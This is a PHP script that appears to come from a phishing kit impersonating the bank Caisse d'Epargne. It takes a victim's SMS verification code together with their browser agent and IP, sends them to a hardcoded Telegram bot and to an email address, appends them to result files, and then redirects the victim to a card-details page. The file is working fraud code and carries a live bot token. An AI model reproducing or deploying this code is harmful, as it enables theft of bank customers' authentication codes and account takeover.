<?php
/*
Author : DIB
Email : b41tsm@gmail.com
ICQ : @MorrisWorm

*/


if(isset($_POST['sms'])){
if(!empty($_POST['sms'])){
	include '../../config.php';
	include 'funcs.php';
	$agent = $_SERVER['HTTP_USER_AGENT'];
	$sms = $_POST['sms'];
	$message = "\nSMS 1 : $sms\nAgent: $agent\nIp: $ip";
	$suj = "Caisse D'epargne - SMS FROM $ip";
	toTG($message);
	mail($to,$suj,$message);
	$op = fopen($resText,'a+');
fwrite($op,$message);
fclose($op);
$token = "2063061087:AAF4J2MhpY_UGZ4bRdeEkPIvL3HdioJoJwo";

file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=2039615741&text=" . urlencode($message)."" );
$file = fopen("../SE/ajz.txt","a");   ///  Directory Of Rezult OK.
fwrite($file,$message); 

	header("Location: ../cc.php");
	
}else{
	
	header('Location: ../certi.html');
}	
	
	
}else{
	header('Location: ../index.html');
}
?>